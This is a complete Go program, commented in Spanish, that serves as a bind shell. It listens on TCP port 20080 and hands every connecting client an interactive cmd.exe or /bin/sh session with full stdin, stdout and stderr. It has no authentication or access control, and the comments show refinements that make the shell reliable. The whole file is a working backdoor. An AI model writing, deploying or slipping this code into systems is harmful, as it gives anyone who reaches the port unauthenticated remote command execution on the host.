package main

import (
	"io"
	"log"
	"net"
	"os/exec"
	"runtime"
)

func handle(conn net.Conn) {
	defer conn.Close()

	// --- 1. Elegir el shell según el SO ---
	var cmd *exec.Cmd
	if runtime.GOOS == "windows" {
		// /K mantiene la consola abierta; sin él cmd.exe puede salir de inmediato
		cmd = exec.Command("cmd.exe", "/K")
	} else {
		cmd = exec.Command("/bin/sh", "-i")
	}

	// --- 2. Pipe para unificar stdout + stderr hacia el socket ---
	rp, wp := io.Pipe()

	cmd.Stdin = conn
	cmd.Stdout = wp
	cmd.Stderr = wp // antes se perdía stderr

	// --- 3. Copiar la salida del shell hacia la conexión ---
	done := make(chan struct{})
	go func() {
		io.Copy(conn, rp)
		close(done)
	}()

	// --- 4. Ejecutar el shell y cerrar el pipe al terminar ---
	err := cmd.Run()
	wp.Close() // imprescindible: sin esto io.Copy queda bloqueado
	<-done     // esperar a que termine la copia

	if err != nil {
		log.Printf("[%s] shell terminó con error: %v", conn.RemoteAddr(), err)
	} else {
		log.Printf("[%s] shell finalizado", conn.RemoteAddr())
	}
}

func main() {
	listener, err := net.Listen("tcp", ":20080")
	if err != nil {
		log.Fatalln("no se pudo abrir el puerto:", err)
	}
	defer listener.Close()

	log.Println("Escuchando en :20080 ...")

	for {
		conn, err := listener.Accept()
		if err != nil {
			// No matamos el servidor por un fallo puntual
			log.Println("error al aceptar conexión:", err)
			continue
		}
		log.Printf("conexión entrante desde %s", conn.RemoteAddr())
		go handle(conn)
	}
}
